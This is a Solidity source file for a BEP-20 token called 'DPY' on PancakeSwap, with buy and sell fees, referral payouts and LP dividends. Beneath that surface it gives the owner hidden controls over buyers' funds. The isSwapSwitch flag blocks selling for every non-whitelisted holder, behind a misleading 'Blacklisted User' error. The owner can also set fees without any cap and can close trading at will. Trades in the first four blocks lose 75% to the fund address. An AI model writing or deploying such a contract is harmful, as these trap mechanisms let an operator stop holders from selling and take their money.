// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function sync() external;
}

interface IMintToken {
    function mint(address account, uint256 amount) external;
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public _bToken;
    address public _bLP;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    mapping(address => address) public _invitor;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _usdt;
    mapping(address => bool) private _swapPairList;

    bool private inSwap;
    bool public isSwapSwitch = true;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFee = 10;
    uint256 public _buyMintBTokenFee = 8;
    uint256 public _buyDriveTokenFee = 1;

    uint256 public _sellBTokenLPFee = 2;
    uint256 public _sellLPFee = 2;
    uint256 public _sellLPHoldFee = 2;
    uint256 public _sellInviteFee = 2;
    uint256 public _sellDriveTokenFee = 1;

    uint256 public swapTokensAtAmount = 10000 * 10 ** 18;
    bool public isSwapAll = true;

    uint256 public startTradeBlock;
    address public _mainPair;
    address public specifiedAddress = 0xEc7ABf383235B39040A4E030842A474Ef9e2Bf64;

    uint256 public _limitAmount;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address BToken, address BLP, uint256 LimitAmount ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address mainPair = swapFactory.createPair(address(this), USDTAddress);
        _swapPairList[mainPair] = true;
        _mainPair = mainPair;

        _swapPairList[swapFactory.createPair(address(this), swapRouter.WETH())] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[FundAddress] = total;
        emit Transfer(address(0), FundAddress, total);

        fundAddress = FundAddress;
        setWhiteList();
        _tokenDistributor = new TokenDistributor(USDTAddress);

        lpRewardCondition = 10 * 10 ** Decimals;
        _bToken = BToken;
        _bLP = BLP;

        _limitAmount = LimitAmount * 10 ** Decimals;
    }

    function setWhiteList() private {
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(0x61616B5329b19c2D65F043A784fB25bb05966e4C)] = true;
        _feeWhiteList[address(0x10ED43C718714eb63d5aA57B78B54704E256024E)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
        _feeWhiteList[address(0xCfffb59F8B10Cd996Fc43d7Abc75A15eC8dcd1E4)] = true;
        _feeWhiteList[address(0x5311bd8A42E576c96bfbcf641fF0d270C2A10f1a)] = true;
        _feeWhiteList[address(0x98712b8Fe67122567f275A7cfc7984276597d2fD)] = true;
        _feeWhiteList[address(0x6A8a626FDa9D42d85211Daf1CdFf49919EEFfCF4)] = true;

        _feeSwapList[msg.sender] = true;
        _feeSwapList[address(this)] = true;
        _feeSwapList[0x61616B5329b19c2D65F043A784fB25bb05966e4C] = true;
        _feeSwapList[address(0x10ED43C718714eb63d5aA57B78B54704E256024E)] = true;
        _feeSwapList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _feeSwapList[address(0xCfffb59F8B10Cd996Fc43d7Abc75A15eC8dcd1E4)] = true;
        _feeSwapList[address(0x5311bd8A42E576c96bfbcf641fF0d270C2A10f1a)] = true;
        _feeSwapList[address(0x98712b8Fe67122567f275A7cfc7984276597d2fD)] = true;
        _feeSwapList[address(0x6A8a626FDa9D42d85211Daf1CdFf49919EEFfCF4)] = true;
        _feeSwapList[address(0x93da91bC79B3Fa187c39Ce24F1D74A84733C0476)] = true;
        _feeSwapList[address(0xaC650E241467188Bc7a6494fdd22B3720aC308E3)] = true;
        _feeSwapList[address(0x8E0b492662981366656B845d5D7c804F37f6Bbf9)] = true;

        
        excludeLpProvider[address(0)] = true;
        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;
        excludeLpProvider[address(0x61616B5329b19c2D65F043A784fB25bb05966e4C)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal - _balances[address(0)] - _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == address(0) || account == address(0x000000000000000000000000000000000000dEaD)) {
            return 0;
        }
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    mapping(address => bool) public _feeSwapList;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 txFee;
        bool isBuy;

        if(_swapPairList[from] || _swapPairList[to]){
            if(!_feeSwapList[from] && !_feeSwapList[to]){
                require(isSwapSwitch, "Blacklisted User");
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                if (_swapPairList[to] && IERC20(to).totalSupply() == 0) {
                    require(_feeWhiteList[from], "!Trading");
                    startTradeBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock || block.number < startTradeBlock + 4) {
                    _funTransfer(from, to, amount);
                    return;
                }
                if (!inSwap && _swapPairList[to]) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
                    if (canSwap) {
                        if(isSwapAll){
                            contractTokenBalance = swapTokensAtAmount;
                        }
                        swapTokenForFund(contractTokenBalance);
                    }
                }

                txFee = 1;
                if (_swapPairList[from]) {
                    isBuy = true;
                }
            }
        } else {
            if (address(0) == _invitor[to] && !_feeWhiteList[to] && 0 == _balances[to]) {
                _invitor[to] = from;
            }
        }

        _tokenTransfer(from, to, amount, txFee, isBuy);
        if (_limitAmount > 0 && !_swapPairList[to] && !_feeWhiteList[to]) {
            require(_limitAmount >= balanceOf(to), "exceed LimitAmount");
        }

        if (_swapPairList[to]) {
            addLpProvider(from);
        }

        if (from != address(this)) {
            processLP(500000);
        }
    }


    function _funTransfer( address sender, address recipient, uint256 tAmount ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 75 / 100;

        _takeTransfer( sender, fundAddress, feeAmount );

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer( address sender, address recipient, uint256 tAmount,  uint256 fee, bool isBuy ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (fee > 0) {
            if (isBuy) {
                uint256 buyFeeAmount = tAmount * _buyFee / 100;

                uint256 buyDriveTokenFee = tAmount * _buyDriveTokenFee / 100;
                feeAmount += buyDriveTokenFee;
                address inviter = _invitor[recipient];
                _takeTransfer( sender, inviter, buyDriveTokenFee );

                if (buyFeeAmount > 0) {
                    feeAmount += buyFeeAmount;
                    _takeTransfer( sender, address(this), buyFeeAmount );

                    if (tx.origin == recipient) {
                        uint256 mintAmount = tAmount * _buyMintBTokenFee / 100;
                        address bToken = _bToken;
                        address[] memory path = new address[](3);
                        path[0] = address(this);
                        path[1] = address(_usdt);
                        path[2] = bToken;
                        uint256[] memory amountsOuts = _swapRouter.getAmountsOut(mintAmount, path);
                        IMintToken mintToken = IMintToken(bToken);
                        mintToken.mint(recipient, amountsOuts[2]);
                    }
                }
            } else {
                address current = sender;

                uint256 sellDriveTokenFee = tAmount * _sellDriveTokenFee / 100;
                feeAmount += sellDriveTokenFee;
                address upAddress = _invitor[current];
                if(address(0) == upAddress){
                    upAddress = address(this);
                }
                _takeTransfer( sender, upAddress, sellDriveTokenFee );

                uint256 inviterAmount = tAmount * _sellInviteFee / 100;
                uint256 taxAmount = inviterAmount;
                feeAmount += inviterAmount;

                uint256 perInviteAmount = inviterAmount / 4;
                for (uint256 i; i < 2; ++i) {
                    address inviter = _invitor[current];
                    
                    if (0 == i) {
                        inviterAmount = perInviteAmount * 3;
                    } else {
                        inviterAmount = perInviteAmount;
                    }
                    if (address(0) == inviter) {
                        _takeTransfer(sender, address(this), inviterAmount);
                    }else{
                        IERC20 mainpair = IERC20(_mainPair);
                        if(mainpair.balanceOf(inviter) > 0){
                            taxAmount -= inviterAmount;
                            _takeTransfer(sender, inviter, inviterAmount);
                        }else{
                            _takeTransfer(sender, address(this), inviterAmount);
                        }
                    }
                    current = inviter;
                }

                uint256 sellLPHoldDividendAmount = tAmount * _sellLPHoldFee / 100;
                feeAmount += sellLPHoldDividendAmount;
                _takeTransfer( sender, address(_tokenDistributor), sellLPHoldDividendAmount  );

                uint256 LPAmount = tAmount * _sellLPFee / 100;
                feeAmount += LPAmount;
                _takeTransfer(sender, specifiedAddress, LPAmount );

                uint256 sellBTokenLPAmount = tAmount * _sellBTokenLPFee / 100;
                taxAmount += sellBTokenLPAmount;
                feeAmount += sellBTokenLPAmount;
                _takeTransfer( sender, address(this), taxAmount );
            }
        }


        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        address usdt = _usdt;
        address tokenDistributor = address(_tokenDistributor);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        address bLP = _bLP;
        USDT.transferFrom(tokenDistributor, bLP, usdtBalance);
        ISwapPair(bLP).sync();
    }

    function _takeTransfer( address sender, address to, uint256 tAmount ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
        _feeSwapList[addr] = true;
    }

    function setSpecifiedAddress(address addr) external onlyFunder {
        specifiedAddress = addr;
    }

    function setBToken(address addr) external onlyFunder {
        _bToken = addr;
    }

    function setBLP(address addr) external onlyFunder {
        _bLP = addr;
    }

    function withdraw()  external onlyOwner {
		payable(msg.sender).transfer(address(this).balance);
	}

    function setIsSwapSwitch(bool success)  external onlyOwner {
        isSwapSwitch = success;
	}
    function setSwapTokensAtAmount(uint256 amount) external onlyOwner {
        swapTokensAtAmount = amount;
    }
    function withdrawTokenCoin(address token, address recipient) external onlyOwner {
        uint256 amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(recipient, amount);
	}

    function setBuyFee(uint256 buyFee, uint256 buyMintFee, uint256 buyDriveTokenFee) external onlyOwner {
        _buyFee = buyFee;
        _buyMintBTokenFee = buyMintFee;
        _buyDriveTokenFee = buyDriveTokenFee;
    }

    function setSellFee(uint256 sellLPFee, uint256 sellLPHoldFee, uint256 sellInviteFee, uint256 sellBTokenFee, uint256 sellDriveTokenFee) external onlyOwner {
        _sellLPFee = sellLPFee;
        _sellLPHoldFee = sellLPHoldFee;
        _sellInviteFee = sellInviteFee;
        _sellBTokenLPFee = sellBTokenFee;
        _sellDriveTokenFee = sellDriveTokenFee;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
        _feeSwapList[addr] = enable;
    }
    function setFeeSwapList(address addr, bool enable) external onlyFunder {
        _feeSwapList[addr] = enable;
    }
    

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(fundAddress, amount);
    }

    function getInviter(address account) external view returns (address){
        return _invitor[account];
    }


    address[] private lpProviders;
    mapping(address => uint256) lpProviderIndex;
    mapping(address => bool) excludeLpProvider;

    function addLpProvider(address adr) private {
        if (0 == lpProviderIndex[adr]) {
            if (0 == lpProviders.length || lpProviders[0] != adr) {
                lpProviderIndex[adr] = lpProviders.length;
                lpProviders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private lpRewardCondition;
    uint256 private progressLPBlock;

    function processLP(uint256 gas) private {
        if (progressLPBlock + 200 > block.number) {
            return;
        }
        IERC20 mainpair = IERC20(_mainPair);
        uint totalPair = mainpair.totalSupply();
        if (0 == totalPair) {
            return;
        }

        address tokenDistributor = address(_tokenDistributor);
        uint256 tokenBalance = balanceOf(tokenDistributor);
        if (tokenBalance < lpRewardCondition) {
            return;
        }

        address shareHolder;
        uint256 pairBalance;
        uint256 amount;

        uint256 shareholderCount = lpProviders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = lpProviders[currentIndex];
            pairBalance = mainpair.balanceOf(shareHolder);
            if (pairBalance > 0 && !excludeLpProvider[shareHolder]) {
                amount = tokenBalance * pairBalance / totalPair;
                if (amount > 0) {
                    _tokenTransfer(tokenDistributor, shareHolder, amount, 0, false);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressLPBlock = block.number;
    }
    function setIsSwapAll(bool success) external onlyOwner {
        isSwapAll = success;
    }
    function setLPRewardCondition(uint256 amount) external onlyFunder {
        lpRewardCondition = amount * 10 ** _decimals;
    }

    function setExcludeLPProvider(address addr, bool enable) external onlyFunder {
        excludeLpProvider[addr] = enable;
    }

    function setLimitAmount(uint256 amount) external onlyFunder {
        _limitAmount = amount * 10 ** _decimals;
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}
}



contract AToken is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "DPY",
        "DPY",
        18,
        100000,
        address(0x61616B5329b19c2D65F043A784fB25bb05966e4C),
        address(0xbE6C035BFB5Ad064bF63231c908cC762BD037600),
        address(0xCDE95CD1fa0AdfA08258feA78857770d4eEdEF95),  
        2000
    ){}
}